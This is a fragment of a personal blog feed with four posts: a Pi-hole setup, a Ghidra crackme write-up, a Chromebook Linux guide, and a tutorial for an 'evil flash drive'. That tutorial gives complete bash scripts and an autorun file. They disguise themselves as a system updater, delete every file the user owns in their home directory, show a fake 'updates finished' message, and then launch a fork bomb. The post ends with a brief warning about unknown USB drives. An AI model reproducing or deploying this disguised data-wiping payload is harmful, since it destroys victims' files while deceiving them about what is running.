normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.&lt;/p&gt;

&lt;p&gt;So lets get right into how I did this. The first thing I did was that I SSH’ed into my raspberry pi and typed in the below command to start installing Pi-hole.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sSL https://install.pi-hole.net | bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/installing.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, I had to select the upstream DNS provider, which is who my raspberry pi would forward DNS requests to if the DNS query is not on the blacklist. I like to use &lt;a href=&quot;https://www.quad9.net/&quot;&gt;Quad9’s DNS server&lt;/a&gt; as opposed to Google’s DNS server (or any other popular DNS server) because Quad9 uses threat intelligence in order to block malware and other threats.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/quad9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pi-hole also asked me if I wanted to change the third-party lists that they use or if I wanted to change which protocol they used. I kept the default values.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lists.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/protocols.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I kept my current network settings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/ip.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I kept the default values for everything else.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webadmin.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lighttpd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/logging.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/privacy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/complete.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once everything was done on my raspberry pi’s side, I had to go into my router settings to change the DNS server settings so that they pointed to my new DNS server. I used Quad9’s DNS server as my backup secondary DNS server in case my raspberry pi failed for whatever reason.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/dnssettings.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also went ahead and changed my current raspberry pi’s IP address to be a static IP address that the DHCP server could not change.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/staticip.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, everything was finished. I could now login to my Pi-hole’s web admin page and see it all running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webpage.png&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using Pi-hole. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.</summary></entry><entry><title type="html">Solving a Basic Crackme Using Ghidra</title><link href="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html" rel="alternate" type="text/html" title="Solving a Basic Crackme Using Ghidra" /><published>2019-03-11T00:00:00-04:00</published><updated>2019-03-11T00:00:00-04:00</updated><id>http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra</id><content type="html" xml:base="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html">&lt;p&gt;Recently, the NSA released a free reverse-engineering tool called &lt;a href=&quot;https://www.nsa.gov/resources/everyone/ghidra/&quot;&gt;Ghidra&lt;/a&gt;. Today, I decided to take a look at it and try to solve a basic crackme using this tool. &lt;a href=&quot;https://crackmes.one/crackme/5c1a939633c5d41e58e005d1&quot;&gt;This&lt;/a&gt; is the link to the crackme that I will be trying to solve today.&lt;/p&gt;

&lt;p&gt;Once I downloaded the crackme file, I ran it and looked at what the program did. Here is its basic output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
a
wrong string
No flag for you.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
Some Random Input
too long...sorry no flag for you!!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It looks like it takes some sort of input value, and if that input value is what it expects, then it will print out the flag. If the input value is incorrect or too long, then it will print out a different message. Our goal here is to find out the correct input value.&lt;/p&gt;

&lt;p&gt;I started up Ghidra, created a new project, and added the binary file to my project. You can do this by first clicking File-&amp;gt;New Project, and then dragging and dropping the binary file into the project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/ghidra_project.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;float: right&quot; src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/symbol_tree.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When I opened the file in Ghidra, a pop-up came up in Ghidra asking me if I wanted to analyze the binary now. I hit yes and waited a second before it was done analyzing the file. Then I went to the symbol tree on the left, typed in “main” to find the main function, and clicked on it. This brought me to the main method, and on the other two windows I could see the main method’s assembly and decompiled code.&lt;/p&gt;

&lt;p&gt;Here is the decompiled code. I changed a few of the variable names to make it a little bit more readable. You can do this by right-clicking on the variable and clicking “Rename variable.”&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;undefined8 main(void)

{
  size_t len;
  size_t len2;
  long lVar1;
  char input [112];
  int counter;
  int strValues;
  
  strValues = 0;
  puts(&quot;enter the magic string&quot;);
  fgets(input,100,stdin);
  len = strlen(input);
  if (len &amp;lt; 0xc) {
    counter = 0;
    while( true ) {
      len2 = strlen(input);
      if (len2 &amp;lt;= (ulong)(long)counter) break;
      strValues = strValues + (int)input[(long)counter];
      counter = counter + 1;
    }
    if (strValues == 1000) {
      lVar1 = strcat_str();
      printf(&quot;flag is flag{&quot;);
      counter = 0;
      while (counter &amp;lt; 10) {
        putchar((int)*(char *)(lVar1 + (long)counter));
        counter = counter + 1;
      }
      puts(&quot;}&quot;);
    }
    else {
      puts(&quot;wrong string\nNo flag for you.&quot;);
    }
  }
  else {
    puts(&quot;too long...sorry no flag for you!!!&quot;);
  }
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that the code does is print out “enter the magic string” and reads in the value that you typed in into a variable that I named “input”. It also calculates the length of this input variable and makes sure that it is less than 12 (which makes it a maximum of ten characters plus a newline character). After that, there is a loop that adds up all of the ascii values of each character of the input into an integer that I named “strValues”. Then, finally, it prints out the flag if the total values of all the added ascii values equals 1000.&lt;/p&gt;

&lt;p&gt;Since I knew that I could type in a maximum of ten characters, the first thing I tried to do was to divide 1000 by 10 to figure out the ascii value of the characters that I needed to type in ten times. Since 1000/10 = 100, and ‘d’ is 100 in ascii, I decided to type in ‘d’ ten times and see what happened.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('d' * 10)&quot; | ./rev30
enter the magic string
wrong string
No flag for you.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unforunately, this did not work. At first I didn’t understand why this didn’t work, but then I realized that I forgot to take into account the fact that the while loop was also adding up the value of the newline character, which had an ascii value of 10. This meant that instead of doing 1000/10 to figure out the ascii value of the character I had to type in 10 times, I had to do (1000-10)/10 to take this into account. This gave me a value of 99, or ‘c’ in ascii. I tried to use ‘c’ ten times, and lo and behold:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('c' * 10)&quot; | ./rev03 
enter the magic string
flag is flag{!#&amp;amp;*/5&amp;lt;DMW}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks for reading this writeup. I hope you enjoyed it.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, the NSA released a free reverse-engineering tool called Ghidra. Today, I decided to take a look at it and try to solve a basic crackme using this tool. This is the link to the crackme that I will be trying to solve today.</summary></entry><entry><title type="html">Basic Evil Flash Drive That Deletes Linux User’s Data</title><link href="http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything.html" rel="alternate" type="text/html" title="Basic Evil Flash Drive That Deletes Linux User's Data" /><published>2019-01-25T00:00:00-05:00</published><updated>2019-01-25T00:00:00-05:00</updated><id>http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything</id><content type="html" xml:base="http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything.html">&lt;p&gt;Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a &lt;a href=&quot;https://en.wikipedia.org/wiki/Fork_bomb&quot;&gt;fork bomb&lt;/a&gt; to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 25%; height: 25%;&quot; src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updates.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So lets jump right into it. I had a flash drive that I just reformatted into &lt;a href=&quot;https://en.wikipedia.org/wiki/Ext4&quot;&gt;ext4&lt;/a&gt;. The first thing that I did was create a folder called “updates” in my flash drive, which would be used to hold majority of the code. My next task was to develop the updater pop-up that you see above. This was quite simple to create; all I did was use a program called &lt;a href=&quot;https://en.wikipedia.org/wiki/Zenity&quot;&gt;Zenity&lt;/a&gt; to bring up the updating window. Zenity is a tool used to easily develop these dialog boxes using commands from the terminal. It was already installed by default on my Ubuntu machine, so it was my natural choice to create the dialog box. By running the below command, I was able to develop the window that you see above:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zenity --progress --pulsate --no-cancel --text=&quot;Updating...&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, my usage of zenity caused a slight problem. What if this flash drive was going to be put into a system that didn’t have Zenity installed? To solve this problem, I typed in this command to find the location of zenity:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whereis zenity
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And got this output:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zenity: /usr/bin/zenity /usr/share/zenity /usr/share/man/man1/zenity.1.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, I went ahead and copied the version of zenity located in /usr/bin/zenity to the updates folder located in my flash drive and renamed the program to “updater” so that it was less obvious that it was, in fact, not used for updating your computer. Now my flash drive could run the zenity program directly from the flash drive, which meant that even if this flash drive was put into a computer that did not have zenity installed, it could still run zenity.&lt;/p&gt;

&lt;p&gt;After that, I needed a script that would run zenity from the flash drive, so I made a file called updates.sh inside the updates folder and put this code inside of it:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
./updater &lt;span class=&quot;nt&quot;&gt;--progress&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--pulsate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-cancel&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Updating...&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;All that this code does is cd into the current directory and run zenity (which I renamed to updater) using the flags that create the window that I wanted.&lt;/p&gt;

&lt;p&gt;The next step was to create a bash file that could do actual damage to the system. Inside the updates folder, I made a file called “data.sh”, which would be used to destroy the data. I added this code into the file:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5
&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
find &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I added the “sleep 5” command so that the user could view the zenity window for five seconds before watching their files be utterly demolished. The next line of code figures out the user’s username, which is needed to run the next command. The find command that comes right after that will find all of the documents that the user owns and deletes them one by one. I didn’t use rm -rf /, which is the usual way that people delete files, because that requires root permissions to delete most of those files, and I wanted to be able to run this without asking the user for root permissions. That is why I instead use the find command to find files that the user owns instead of wasting my time with files that the user does not have permission to delete anyways.&lt;/p&gt;

&lt;p&gt;I also downloaded an icon that looked sort of like an updating computer, and placed that under the updates folder. This icon will eventually be seen on the user’s desktop.&lt;/p&gt;

&lt;p&gt;The next thing I did was to go to the root of the flash drive directory (outside the /updates folder), and create a file called Autorun.inf. This is a special file that will tell the operating system certain information about this particular flash drive. I added these lines of code into this file:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
Open=autorun.sh
Action=Start Updates
Label=Updater
Icon=updates/updater.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This tells the operating system to open “autorun.sh” by default when this flash drive is connected, use the label of “Updater,” and use the icon located in the updates folder. It looked something like the image below when I reconnected the flash drive.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 25%; height: 25%;&quot; src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/icon.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, I only had one more little step to do. I just had to create an autorun.sh file that would run when the flash drive was inserted. (By default, linux will usually bring up a pop-up asking the user “Would you like to run the software on this flash drive?” for security reasons. Technically this will not be run right when the flash drive is inserted, but only after the user allows it to run. If it was not setup like this by default, then that could cause a huge security hole because a malicious user could insert a flash drive into any computer and run whatever they wanted.) I created an autorun.sh file at the root directory of my flash drive and put this inside it:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;updates

./data.sh | ./updates.sh
./updater &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Your computer has finished all updates.&quot;&lt;/span&gt;

:&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;:|:&amp;amp;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The first thing that this bash file does is that it changes into the directory of the updates folder. After that, it runs data.sh and updates.sh at the same time (The pipette is used so that when data.sh is done deleting all of the files, updates.sh will also stop as well). After that, it will use zenity to print out a message saying “Your computer has finished all updates.” Then the code ends by delivering the fork bomb.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:() {
    :|:&amp;amp;
};
:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A fork bomb, in case you do not know, is a piece of bash code that will usually result in the computer crashing (although many operating systems today will have some defenses setup), and even if the computer doesn’t crash, it will usually slow it down. When you break down the fork bomb, there are three main parts to it (as shown above). 1.) It defines a function called “:” using “:()”. 2.) It opens the body of the function using the curly bracket. Inside the body of the function, it calls itself using “:|:&amp;amp;”. The “&amp;amp;” is used to run something in the background, and the pipette can be used to run another command in the background, so “:|:&amp;amp;” makes the function call itself twice and background it. Each call to “:” spawns even more calls to “:”, leading to an infinitely recursive process that slowly consumes the system resources. 3.) The program will then close the function using “};”, then it will call the function with the last “:”, which begins this whole process. For your convenience, A better looking version of the fork bomb is below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foo() {
    call foo | call foo &amp;amp;
};
call foo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This pretty much wraps up this blog post. All I did now was just set all of my bash files to executable using the “chmod +x [file]” command. I ran the evil flash drive inside an Ubuntu virtual machine, and it worked perfectly. Everything in the user’s home directory was demolished, and a pop up saying “Ubuntu experienced a system error” even came up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/runsoftware.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First it asked me whether I wanted to run the software (which was the security issue I mentioned earlier).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updating.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then it started to show the pulsating update bar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/doneupdating.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it was done deleting all of my files (it didn’t take too long, I didn’t have much in my virtual machine), the updates bar was completely filled.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/finishedupdates.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It states that I have completed all of my updates.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/thereaintshit.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, everything in my home folder is now gone. Also, the fork bomb that I implemented earlier is running in the background, making this virtual machine run a lot slower.&lt;/p&gt;

&lt;p&gt;While this was just a basic program that could easily be built in a few minutes, much more advanced evil USBs have been built. For example, &lt;a href=&quot;https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/The-bad-USB-vulnerability1.pdf&quot;&gt;these guys&lt;/a&gt; were able to create a USB that could impersonate a different USB peripheral without the user noticing. This just goes to show that you should not plug in any USB flash drive unless you know that does not contain any malicious programs. You should especially never plug in a random USB that you found without knowing and trusting its source.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a fork bomb to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.</summary></entry><entry><title type="html">Installing Linux In Chromebook Using Crouton</title><link href="http://localhost:4000/2019/01/15/installing-linux-in-chromebook.html" rel="alternate" type="text/html" title="Installing Linux In Chromebook Using Crouton" /><published>2019-01-15T00:00:00-05:00</published><updated>2019-01-15T00:00:00-05:00</updated><id>http://localhost:4000/2019/01/15/installing-linux-in-chromebook</id><content type="html" xml:base="http://localhost:4000/2019/01/15/installing-linux-in-chromebook.html">&lt;p&gt;I was recently able to get my hands on a Chromebook for free. Normally, ChromeOS (which is one of the most useless OSes created) just allows the user to do very basic tasks, such as browsing the internet or accessing documents, and is more geared towards older and more non-technical users. However, it is possible to unlock other potential uses for ChromeOS, one of which is running Linux on the Chromebook. In this post, I’m going to go ahead and show you exactly how I was able to get Ubuntu up and running in my Chromebook using a nice tool called &lt;a href=&quot;https://github.com/dnschneid/crouton&quot;&gt;crouton&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The first step is to boot the Chromebook in recovery mode. This is done by pressing and holding the escape and refresh keys while pressing the power button at the same time. Once recovery mode opens up, press Ctrl-D to switch to developer mode. It will take a little while for the Chromebook to finish switching to developer mode, but once it is done, you will see a screen that looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-15-installing-linux-in-chromebook/boot.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wait another minute, and it should reboot into ChromeOS. Sometimes you’ll hear two loud beeps coming out of the notebook. Now the Chromebook will always use developer mode whenever you boot into it (unless you turn it off).&lt;/p&gt;

&lt;p&gt;The next step is to install crouton. Click &lt;a href=&quot;https://goo.gl/fd3zc&quot;&gt;here&lt;/a&gt; and place the file in the Downloads folder. Next, go into the Chromebook’s terminal by pressing Ctrl+Alt+T. Type in “shell” in the black window that pops up to open up the shell. Then run this command to install Linux onto the Chromebook:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo sh ~/Downloads/crouton -t gnome
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will install Ubuntu by default, but you can change which OS is installed. Typing in “sudo sh ~/Downloads/crouton -r list” will show a list of operating systems that are supported by crouton. Typing in “sudo sh ~/Downloads/crouton -r [operating system]” will install that specific OS. To install a specific GUI, use the “-t” switch (and use “-t list” to list out all the different desktop environments).&lt;/p&gt;

&lt;p&gt;It will take a few minutes to completely install the OS, and will also ask you to create a username and password for an account on the newly created chroot. Once this is done, you can type in “startgnome” to switch to that operating system (note that this command will change if you’ve installed a different GUI).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-15-installing-linux-in-chromebook/linux.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You should now be able to use Ctrl+Shift+Alt+Forward and Ctrl+Shift+Alt+Backward (Forwards and backwards keys are found at the upper left corner) to move back and forth between OSes. Thankfully, now we can make use of this device and do more interesting things with it.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
